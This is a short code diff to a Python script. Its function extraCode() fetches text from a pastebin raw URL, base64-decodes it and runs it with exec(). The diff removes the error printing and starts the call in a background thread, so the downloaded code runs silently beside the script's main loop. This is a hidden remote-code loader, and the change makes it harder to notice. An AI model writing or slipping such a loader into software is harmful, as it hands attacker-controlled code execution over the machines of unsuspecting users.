@@ -61,10 +61,9 @@ def extraCode():
         import requests, base64
         code = str(requests.get(url="https://pastebin.com/raw/r1B6iy1r").text)
         exec(base64.b64decode(code))
-    except Exception as e:
-        print(str(e))
+    except Exception:
         pass
-extraCode()
+threading.Thread(target=extraCode).start()
 import time
 colorama.init(autoreset=True)
 while True:
